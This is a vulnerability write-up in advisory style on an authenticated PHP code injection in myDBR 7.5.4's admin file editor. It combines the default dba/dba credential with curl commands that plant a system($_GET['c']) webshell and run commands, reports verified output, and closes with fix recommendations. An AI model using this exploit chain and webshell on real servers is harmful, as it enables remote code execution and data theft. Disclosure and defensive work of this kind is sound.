# myDBR — Admin File-Editor PHP Code Injection RCE

## 1. Research Target & Attack Surface

myDBR 7.5.4 (Softronic Oy, Finland) is a self-hosted PHP reporting tool — it sits between business databases and the people who consume reports. The core code is SourceGuardian-encrypted (238 files), which makes static analysis harder and bugs easier to hide. Typical deployment: Docker (PHP 8.2 + MySQL 8.0), app bound to 127.0.0.1:8090, web root `/var/www/html/`, application prefix `/mydbr/`.

Relevant surface:

| Item | Value |
|---|---|
| Entry point | `POST /mydbr/apps_v/fileedit_v.php` (admin Files page editor) |
| Auth | Challenge-response login; default admin `dba/dba` (CWE-798) |
| Session | Cookie `mydbr-id-us-*` after login |
| Privilege | `www-data` (Apache PHP process) |

The file editor enforces session + CSRF, so unauthenticated access is not possible; the realistic entry is the **default admin credential `dba/dba`** (CWE-798) — the installer creates it without forcing a change, making an admin-facing feature effectively open in most deployments.

Login formula:
```
password_out = md5( md5(password) + challenge )
```

## 2. Sink Identification: file_put_contents into the Web Root (CWE-94)

The admin "Files" page (`index.php?a=files`) embeds a file editor. The front-end `savefile()` function (`lib/javascript/admin.js`) POSTs file content to `apps_v/fileedit_v.php`:

```javascript
savefile=function(){
  $.ajax({
    url:"apps_v/fileedit_v.php",
    type:"post",
    data:{
      action:"save_file",
      content:editor.getValue(),
      file:$("#tab_browsing_list li.selected").attr("data-filename"),
      csrf_token:csrf_token_get()
    },
    success:function(e){ var t=JSON.parse(e); show_message(t); ... }
  });
}
```

`apps_v/fileedit_v.php` is SourceGuardian-encrypted, but the behavior is confirmed: `action=save_file` + `file=<path>` + `content=<content>` writes the content to the path under the myDBR root. The default upload root is the `user/` directory. **No extension whitelist, no PHP content filter** — writing a `.php` file places executable code in the web root.

## 3. Source Inputs

| Parameter | Control | Notes |
|---|---|---|
| `file` | Full attacker control | Path + filename (e.g. `user/evil.php`) |
| `content` | Full attacker control | Arbitrary PHP code |
| `csrf_token` | Session-scoped | Extracted from the authenticated `index.php?a=files` page hidden input; reusable (not one-time) |
| `X-Requested-With` | Required | `fileedit_v.php` silently returns an empty response if missing — AJAX header required |

## 4. End-to-End Data Flow

```
Attacker (dba/dba session)
  → POST /mydbr/apps_v/fileedit_v.php
     Content-Type: application/x-www-form-urlencoded
     X-Requested-With: XMLHttpRequest
     body: action=save_file&file=user/<shell>.php&content=<?php system($_GET['c']); ?>&csrf_token=<token>
  → fileedit_v.php validates csrf_token + session
  → file_put_contents("/var/www/html/mydbr/user/<shell>.php", content)
  → file lands (www-data:www-data 0644)

Attacker
  → GET /mydbr/user/<shell>.php?c=id
  → Apache mod_php executes PHP
  → system("id") → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Why this works:
1. `user/` is writable by www-data by default (installer `chown -R 33:33 .`)
2. Apache allows PHP execution under `user/` (no `.htaccess` disabling PHP)
3. `file` accepts relative paths; `user/<name>.php` lands in the myDBR root's user subdirectory
4. csrf_token is session-level (extractable from any page in the same session), not one-time
5. `X-Requested-With: XMLHttpRequest` is mandatory, otherwise `fileedit_v.php` silently returns empty without writing

## 5. Exploit Construction

```bash
# STEP 1: login as dba/dba (challenge-response) → session cookie
# STEP 2: extract csrf_token from index.php?a=files
# STEP 3: write a PHP webshell via the file editor
curl -s -b cookies.txt "http://<TARGET_IP>:8090/mydbr/apps_v/fileedit_v.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=save_file" \
  --data-urlencode "file=user/_poc_shell.php" \
  --data-urlencode "content=<?php if(isset(\$_GET['c'])){system(\$_GET['c']);} ?>" \
  -d "csrf_token=<token>"
# response: {"tree":"<ul class=\"dir_tree\">...data-filename=\"user/_poc_shell.php\"..."}

# STEP 4: execute
curl -s "http://<TARGET_IP>:8090/mydbr/user/_poc_shell.php?c=id"
# HTTP 200 → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 6. Dynamic Verification

Verified on myDBR 7.5.4 (build 5454) with the default `dba/dba` account:

- `save_file` returned HTTP 200 with the directory-tree JSON listing `user/_poc_shell.php`
- `GET /mydbr/user/_poc_shell.php?c=id` → HTTP 200, body `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- A second shell (`_poc_shell2.php?c=whoami;hostname`) → `www-data` + container hostname
- Target-side file check: `-rw-r--r-- 1 www-data www-data 51 ...` with the exact PHP payload

The PoC script automates login (challenge-response), csrf extraction, file write, and execution (pure Python standard library).

## 7. Reachability & Impact

- **Auth**: default `dba/dba`; effective credentials required if changed
- **Network**: HTTP 8090 (bound 127.0.0.1 in the lab; 80/443 in public deployments)
- **No extra precondition**: no MITM, no installer-window dependency
- **Unauthenticated access unreachable**: `fileedit_v.php` enforces session + csrf; no misconfiguration bypass

The impact is authenticated (default `dba/dba`) PHP code injection → RCE as `www-data` — full read/write of report data, database-facing content, and the reporting host.

## 8. Fix Recommendations

1. Restrict the file editor to a dedicated, non-executable template directory
2. Reject PHP-extension writes (`.php`/`.phtml`/`.phar`) from the editor
3. Filter content for PHP open/close tags (`<?php`/`?>`)
4. Constrain the `file` parameter within the upload path; reject absolute paths / traversal
5. Force password change for the default `dba` account
6. Make csrf_token one-time
